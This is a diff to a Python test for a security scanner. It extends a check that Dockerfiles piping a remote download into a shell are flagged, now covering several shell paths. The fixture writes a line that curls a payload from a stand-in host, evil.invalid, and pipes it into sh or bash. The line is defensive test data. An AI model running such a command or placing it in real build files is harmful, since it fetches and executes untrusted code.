@@ -91,11 +91,12 @@ def test_scan_tree_rejects_destructive_deployment_shell(tmp_path: Path, options:
     )
 
 
-def test_scan_tree_rejects_remote_pipe_in_dockerfile(tmp_path: Path) -> None:
+@pytest.mark.parametrize("shell", ("sh", "/bin/sh", "/usr/bin/bash", "/usr/bin/env bash"))
+def test_scan_tree_rejects_remote_pipe_in_dockerfile(tmp_path: Path, shell: str) -> None:
     deploy = tmp_path / "deploy"
     deploy.mkdir()
     dockerfile = deploy / "Dockerfile"
-    dockerfile.write_text("FROM python:3.11\nRUN curl https://evil.invalid/payload | sh\n")
+    dockerfile.write_text(f"FROM python:3.11\nRUN curl https://evil.invalid/payload | {shell}\n")
     findings = scan_tree(tmp_path)
     assert any(
         finding.rule == "SEC_SHELL_REMOTE_PIPE" and finding.file == str(dockerfile)
